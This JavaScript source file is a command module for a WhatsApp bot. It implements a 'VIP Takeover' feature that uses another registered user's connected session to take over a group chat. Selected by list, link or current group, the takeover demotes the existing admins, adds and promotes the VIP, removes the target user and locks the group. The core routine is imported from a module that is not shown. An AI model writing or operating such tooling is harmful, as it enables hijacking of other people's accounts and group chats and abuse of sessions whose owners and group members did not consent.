import { VIPQueries } from "../../database/query.js"
import { VIPHelper, VIPTakeover } from "../../whatsapp/index.js"

export default {
  name: "VIP Takeover",
  description: "Takeover a group using controlled user's session",
  commands: ["viptakeover", "vipattack"],
  category: "vipmenu",
  usage: 
    "• `.viptakeover <number>` - Takeover by selection (reply to vipgroups message)\n" +
    "• `.viptakeover <link> <phone>` - Takeover by group link\n" +
    "• `.viptakeover <phone>` - Takeover current group (when used in a group)",

  async execute(sock, sessionId, args, m) {
    console.log('[VIPTakeoverCmd] ===== COMMAND EXECUTED =====')
    console.log('[VIPTakeoverCmd] Args:', args)
    console.log('[VIPTakeoverCmd] Is group:', m.isGroup)
    console.log('[VIPTakeoverCmd] Has quoted:', !!m.quoted)
    
    try {
      const vipTelegramId = VIPHelper.fromSessionId(sessionId)
      console.log('[VIPTakeoverCmd] VIP Telegram ID:', vipTelegramId)
      
      if (!vipTelegramId) {
        await sock.sendMessage(m.chat, { text: "❌ Could not identify your session" }, { quoted: m })
        return
      }

      const vipStatus = await VIPQueries.isVIP(vipTelegramId)
      console.log('[VIPTakeoverCmd] VIP Status:', vipStatus)
      
      if (!vipStatus.isVIP) {
        await sock.sendMessage(m.chat, { text: "❌ You don't have VIP access." }, { quoted: m })
        return
      }

      // Get VIP's phone number
      const vipSock = await VIPHelper.getVIPSocket(vipTelegramId)
      if (!vipSock) {
        await sock.sendMessage(m.chat, { text: "❌ Your session is not available." }, { quoted: m })
        return
      }
      const vipPhone = VIPHelper.extractPhone(vipSock.user.id)
      console.log('[VIPTakeoverCmd] VIP Phone:', vipPhone)

      // METHOD 1: Reply to vipgroups message with number
      if (m.quoted && args.length === 1 && /^\d+$/.test(args[0])) {
        console.log('[VIPTakeoverCmd] Using Method 1: Selection from list')
        return await this.takeoverBySelection(sock, m, vipTelegramId, vipPhone, parseInt(args[0]))
      }

      // METHOD 2: Direct group link with phone
      if (args.length === 2 && args[0].includes('chat.whatsapp.com')) {
        console.log('[VIPTakeoverCmd] Using Method 2: Direct link')
        const groupLink = args[0]
        const targetPhone = args[1].replace(/[@\s\-+]/g, '')
        return await this.takeoverByLink(sock, m, vipTelegramId, vipPhone, groupLink, targetPhone)
      }

      // METHOD 3: Current group takeover
      if (m.isGroup && args.length === 1) {
        console.log('[VIPTakeoverCmd] Using Method 3: Current group')
        const targetPhone = args[0].replace(/[@\s\-+]/g, '')
        return await this.takeoverCurrentGroup(sock, m, vipTelegramId, vipPhone, targetPhone)
      }

      // Invalid usage
      console.log('[VIPTakeoverCmd] Invalid usage - showing help')
      await sock.sendMessage(m.chat, { 
        text: 
          "❌ *Invalid Usage*\n\n" +
          "*Method 1: Select from list*\n" +
          "1. Use `.vipgroups <phone>`\n" +
          "2. Reply with `.viptakeover <number>`\n\n" +
          "*Method 2: Direct link*\n" +
          "`.viptakeover <group_link> <phone>`\n\n" +
          "*Method 3: Current group*\n" +
          "(In a group) `.viptakeover <phone>`"
      }, { quoted: m })

    } catch (error) {
      console.error("[VIPTakeoverCmd] Execute error:", error)
      await sock.sendMessage(m.chat, { 
        text: "❌ Error during takeover operation." 
      }, { quoted: m })
    }
  },

  async takeoverBySelection(sock, m, vipTelegramId, vipPhone, groupNumber) {
    console.log('[VIPTakeoverCmd] === takeoverBySelection ===')
    console.log('[VIPTakeoverCmd] Group number:', groupNumber)
    
    try {
      // Get cached groups data
      global.vipGroupsCache = global.vipGroupsCache || new Map()
      const cachedData = global.vipGroupsCache.get(m.quoted.id)
      console.log('[VIPTakeoverCmd] Cached data exists:', !!cachedData)

      if (!cachedData) {
        await sock.sendMessage(m.chat, { 
          text: "❌ Groups list expired or not found.\n\nPlease use `.vipgroups <phone>` again." 
        }, { quoted: m })
        return
      }

      const { groups, targetPhone, targetTelegramId } = cachedData
      console.log('[VIPTakeoverCmd] Total groups:', groups.length)
      console.log('[VIPTakeoverCmd] Target phone:', targetPhone)
      console.log('[VIPTakeoverCmd] Target telegram ID:', targetTelegramId)

      if (groupNumber < 1 || groupNumber > groups.length) {
        await sock.sendMessage(m.chat, { 
          text: `❌ Invalid group number. Please choose between 1 and ${groups.length}.` 
        }, { quoted: m })
        return
      }

      const selectedGroup = groups[groupNumber - 1]
      console.log('[VIPTakeoverCmd] Selected group:', selectedGroup.name, selectedGroup.jid)

      await sock.sendMessage(m.chat, { 
        text: `🔄 *Initiating Takeover*\n\n` +
              `📋 Group: ${selectedGroup.name}\n` +
              `🆔 Target User: ${targetPhone}\n` +
              `👤 VIP User: ${vipPhone}\n\n` +
              `Please wait...`
      }, { quoted: m })

      // Perform takeover
      console.log('[VIPTakeoverCmd] Calling VIPTakeover.takeover...')
      const result = await VIPTakeover.takeover(
        vipTelegramId,
        targetTelegramId,
        selectedGroup.jid,
        vipPhone
      )
      
      console.log('[VIPTakeoverCmd] Takeover completed with result:')
      console.log('[VIPTakeoverCmd] Success:', result.success)
      console.log('[VIPTakeoverCmd] Errors:', result.errors)
      console.log('[VIPTakeoverCmd] Steps:', result.steps)

      // Send result
      await this.sendTakeoverResult(sock, m, result, selectedGroup.name)

    } catch (error) {
      console.error("[VIPTakeoverCmd] Selection error:", error)
      const errorMsg = error?.message || error?.toString() || 'Unknown error'
      await sock.sendMessage(m.chat, { 
        text: `❌ Error during takeover: ${errorMsg}` 
      }, { quoted: m })
    }
  },

  async takeoverByLink(sock, m, vipTelegramId, vipPhone, groupLink, targetPhone) {
    console.log('[VIPTakeoverCmd] === takeoverByLink ===')
    console.log('[VIPTakeoverCmd] Group link:', groupLink)
    console.log('[VIPTakeoverCmd] Target phone:', targetPhone)
    
    try {
      // Convert phone to telegram ID
      const targetUser = await VIPQueries.getUserByPhone(targetPhone)
      console.log('[VIPTakeoverCmd] Target user found:', !!targetUser)
      
      if (!targetUser || !targetUser.telegram_id) {
        await sock.sendMessage(m.chat, { 
          text: `❌ User with phone ${targetPhone} is not registered.\n\nThey need to connect first.` 
        }, { quoted: m })
        return
      }

      const targetTelegramId = targetUser.telegram_id
      console.log('[VIPTakeoverCmd] Target telegram ID:', targetTelegramId)

      // Check permission
      const canControl = await VIPHelper.canControl(vipTelegramId, targetTelegramId)
      console.log('[VIPTakeoverCmd] Can control:', canControl)
      
      if (!canControl.allowed) {
        await sock.sendMessage(m.chat, { 
          text: "❌ You do not have permission to control this user." 
        }, { quoted: m })
        return
      }

      await sock.sendMessage(m.chat, { 
        text: `🔄 *Initiating Takeover*\n\n` +
              `🔗 Group Link: ${groupLink}\n` +
              `🆔 Target User: ${targetPhone}\n` +
              `👤 VIP User: ${vipPhone}\n\n` +
              `Please wait...`
      }, { quoted: m })

      // Perform takeover by link
      console.log('[VIPTakeoverCmd] Calling VIPTakeover.takeoverByLink...')
      const result = await VIPTakeover.takeoverByLink(
        vipTelegramId,
        targetTelegramId,
        groupLink,
        vipPhone
      )

      console.log('[VIPTakeoverCmd] Takeover by link completed:')
      console.log('[VIPTakeoverCmd] Success:', result.success)
      console.log('[VIPTakeoverCmd] Error:', result.error)
      console.log('[VIPTakeoverCmd] Errors array:', result.errors)
      console.log('[VIPTakeoverCmd] Steps:', result.steps)

      // Send result
      await this.sendTakeoverResult(sock, m, result)

    } catch (error) {
      console.error("[VIPTakeoverCmd] Link error:", error)
      const errorMsg = error?.message || error?.toString() || 'Unknown error'
      await sock.sendMessage(m.chat, { 
        text: `❌ Error during takeover by link: ${errorMsg}` 
      }, { quoted: m })
    }
  },

  async takeoverCurrentGroup(sock, m, vipTelegramId, vipPhone, targetPhone) {
    console.log('[VIPTakeoverCmd] === takeoverCurrentGroup ===')
    console.log('[VIPTakeoverCmd] Current group JID:', m.chat)
    console.log('[VIPTakeoverCmd] Target phone:', targetPhone)
    
    try {
      // Convert phone to telegram ID
      const targetUser = await VIPQueries.getUserByPhone(targetPhone)
      console.log('[VIPTakeoverCmd] Target user found:', !!targetUser)
      
      if (!targetUser || !targetUser.telegram_id) {
        await sock.sendMessage(m.chat, { 
          text: `❌ User with phone ${targetPhone} is not registered.\n\nThey need to connect first.` 
        }, { quoted: m })
        return
      }

      const targetTelegramId = targetUser.telegram_id
      const groupJid = m.chat
      console.log('[VIPTakeoverCmd] Target telegram ID:', targetTelegramId)

      // Check permission
      const canControl = await VIPHelper.canControl(vipTelegramId, targetTelegramId)
      console.log('[VIPTakeoverCmd] Can control:', canControl)
      
      if (!canControl.allowed) {
        await sock.sendMessage(m.chat, { 
          text: "❌ You do not have permission to control this user." 
        }, { quoted: m })
        return
      }

      await sock.sendMessage(m.chat, { 
        text: `🔄 *Initiating Takeover*\n\n` +
              `📋 Group: Current Group\n` +
              `🆔 Target User: ${targetPhone}\n` +
              `👤 VIP User: ${vipPhone}\n\n` +
              `Please wait...`
      }, { quoted: m })

      // Perform takeover
      console.log('[VIPTakeoverCmd] Calling VIPTakeover.takeover...')
      const result = await VIPTakeover.takeover(
        vipTelegramId,
        targetTelegramId,
        groupJid,
        vipPhone
      )

      console.log('[VIPTakeoverCmd] Takeover completed:')
      console.log('[VIPTakeoverCmd] Success:', result.success)
      console.log('[VIPTakeoverCmd] Errors:', result.errors)
      console.log('[VIPTakeoverCmd] Steps:', result.steps)

      // Send result
      await this.sendTakeoverResult(sock, m, result)

    } catch (error) {
      console.error("[VIPTakeoverCmd] Current group error:", error)
      const errorMsg = error?.message || error?.toString() || 'Unknown error'
      await sock.sendMessage(m.chat, { 
        text: `❌ Error during current group takeover: ${errorMsg}` 
      }, { quoted: m })
    }
  },

  async sendTakeoverResult(sock, m, result, groupName = null) {
    console.log('[VIPTakeoverCmd] === sendTakeoverResult ===')
    console.log('[VIPTakeoverCmd] Result object:', JSON.stringify(result, null, 2))
    
    if (result.success) {
      console.log('[VIPTakeoverCmd] Sending success message')
      
      let successMsg = `✅ *Takeover Successful!*\n\n`
      if (groupName) {
        successMsg += `📋 Group: ${groupName}\n\n`
      }
      successMsg += `*Steps Completed:*\n` +
        `${result.steps.demotedAdmins ? '✅' : '❌'} Demoted other admins\n` +
        `${result.steps.addedVIP ? '✅' : '❌'} Added VIP to group\n` +
        `${result.steps.promotedVIP ? '✅' : '❌'} Promoted VIP to admin\n` +
        `${result.steps.removedUser ? '✅' : '❌'} Removed target user\n` +
        `${result.steps.lockedGroup ? '✅' : '❌'} Locked group\n\n` +
        `🎉 You are now the sole admin!`
      
      await sock.sendMessage(m.chat, { text: successMsg }, { quoted: m })
    } else {
      console.log('[VIPTakeoverCmd] Sending failure message')
      
      let errorMessage = '❌ *Takeover Failed*\n\n'
      
      // Handle single error property (from takeoverByLink)
      if (result.error) {
        console.log('[VIPTakeoverCmd] Has single error property:', result.error)
        errorMessage += `*Error:* ${result.error}\n\n`
      }
      // Handle errors array (from takeover)
      else if (result.errors && Array.isArray(result.errors) && result.errors.length > 0) {
        console.log('[VIPTakeoverCmd] Has errors array:', result.errors)
        const validErrors = result.errors.filter(e => e && e !== 'undefined' && String(e).trim() !== '')
        console.log('[VIPTakeoverCmd] Valid errors after filtering:', validErrors)
        
        if (validErrors.length > 0) {
          errorMessage += `*Errors:*\n${validErrors.map(e => `• ${e}`).join('\n')}\n\n`
        } else {
          errorMessage += '*Error:* Operation failed without specific details\n\n'
        }
      } else {
        console.log('[VIPTakeoverCmd] No errors found in result')
        errorMessage += '*Error:* Operation failed\n\n'
      }
      
      // Add steps status
      if (result.steps) {
        errorMessage += `*Steps Status:*\n` +
          `${result.steps.validation ? '✅' : '❌'} Validation\n` +
          `${result.steps.checkedPermissions ? '✅' : '❌'} Permission check\n` +
          `${result.steps.demotedAdmins ? '✅' : '❌'} Demote admins\n` +
          `${result.steps.addedVIP ? '✅' : '❌'} Add VIP\n` +
          `${result.steps.promotedVIP ? '✅' : '❌'} Promote VIP\n` +
          `${result.steps.removedUser ? '✅' : '❌'} Remove user\n` +
          `${result.steps.lockedGroup ? '✅' : '❌'} Lock group`
      }
      
      console.log('[VIPTakeoverCmd] Final error message:', errorMessage)
      await sock.sendMessage(m.chat, { text: errorMessage }, { quoted: m })
    }
  }
}